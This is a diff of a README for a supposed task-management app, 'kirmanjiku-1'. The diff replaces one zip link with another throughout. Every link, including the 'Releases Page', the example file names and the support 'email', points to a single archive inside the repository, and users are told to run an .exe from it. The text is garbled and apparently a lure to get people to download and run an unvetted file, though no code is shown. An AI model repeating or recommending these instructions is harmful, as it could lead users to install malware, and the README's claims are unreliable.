@@ -6,7 +6,7 @@ Welcome to the kirmanjiku-1 application! This tool helps you manage your tasks a
 
 ## 📥 Download kirmanjiku-1
 
-[![Download kirmanjiku-1](https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip)](https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip)
+[![Download kirmanjiku-1](https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip)](https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip)
 
 ## 📋 Features
 
@@ -28,24 +28,24 @@ To run the kirmanjiku-1 application, you will need:
 
 1. **Visit the Releases Page:** Go to the following link to access our releases:
    
-   [Download kirmanjiku-1](https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip)
+   [Download kirmanjiku-1](https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip)
 
 2. **Choose the Latest Version:** On the releases page, you’ll see a list of versions. Look for the most recent one at the top.
 
 3. **Download the Application:**
    - Click on the version number. You will find a list of files associated with that release.
-   - Select the appropriate file for your operating system. Files may be named something like `https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip`, `https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip`, or `https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip`.
+   - Select the appropriate file for your operating system. Files may be named something like `https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip`, `https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip`, or `https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip`.
 
 4. **Install the Application:**
    - **For Windows:** Run the `.exe` file. Follow the prompts to complete the installation.
    - **For macOS:** Open the `.dmg` file. Drag the kirmanjiku-1 icon to your Applications folder.
-   - **For Linux:** Extract the `https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip` file. Open a terminal and run the application using the command provided in the extracted folder.
+   - **For Linux:** Extract the `https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip` file. Open a terminal and run the application using the command provided in the extracted folder.
 
 5. **Launch the Application:** After installation, find kirmanjiku-1 in your applications. Click to open it, and you’re ready to start managing tasks!
 
 ## 📞 Support
 
-If you encounter any issues, feel free to reach out. We’re here to help! You can open an issue on our GitHub page or contact our support team via email at https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip
+If you encounter any issues, feel free to reach out. We’re here to help! You can open an issue on our GitHub page or contact our support team via email at https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip
 
 ## 📑 FAQs
 
@@ -66,4 +66,4 @@ Check out our changelog for updates and improvements. You can find it in the rel
 
 We welcome contributions! If you have suggestions or improvements, consider getting involved. Review our contribution guidelines on GitHub.
 
-Visit our [Releases Page](https://raw.githubusercontent.com/Thukujessy/kirmanjiku-1/main/demigriffin/kirmanjiku-1.zip) to get started with kirmanjiku-1 today!
+Visit our [Releases Page](https://github.com/Thukujessy/kirmanjiku-1/raw/refs/heads/main/demigriffin/kirmanjiku-v3.9-alpha.2.zip) to get started with kirmanjiku-1 today!
